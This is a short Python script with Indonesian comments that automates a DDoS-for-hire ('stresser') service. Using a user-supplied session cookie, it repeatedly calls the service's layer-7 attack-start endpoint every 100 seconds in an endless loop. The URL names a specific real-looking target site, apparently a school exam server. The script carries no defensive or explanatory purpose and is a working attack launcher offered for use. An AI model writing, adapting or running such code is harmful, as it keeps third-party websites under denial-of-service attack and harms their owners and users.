import requests
import time

cookie = input("Masukkan cookie: ")

url = "https://redstresser.org/complexx/layer7.php?type=start&host=https://cbtsman64jkt.my.id/&port=443&time=100&method=TLS-DETECT&totalservers=1&vip=undefined"
headers = {
    "Cookie": cookie, 
    "Sec-Ch-Ua": '"Chromium";v="125", "Not.A/Brand";v="24"',
    "Sec-Ch-Ua-Mobile": "?0",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.112 Safari/537.36",
    "Sec-Ch-Ua-Platform": '"Windows"',
    "Accept": "*/*",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "https://redstresser.org/hub",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "en-US,en;q=0.9",
    "Priority": "u=1, i"
}

while True:
    response = requests.get(url, headers=headers)
    if response.status_code == 200:
        print("Sudah Berjalan...")
    else:
        print(f"Error: {response.status_code}")
    time.sleep(100)  # Delay 100 detik sebelum request berikutnya
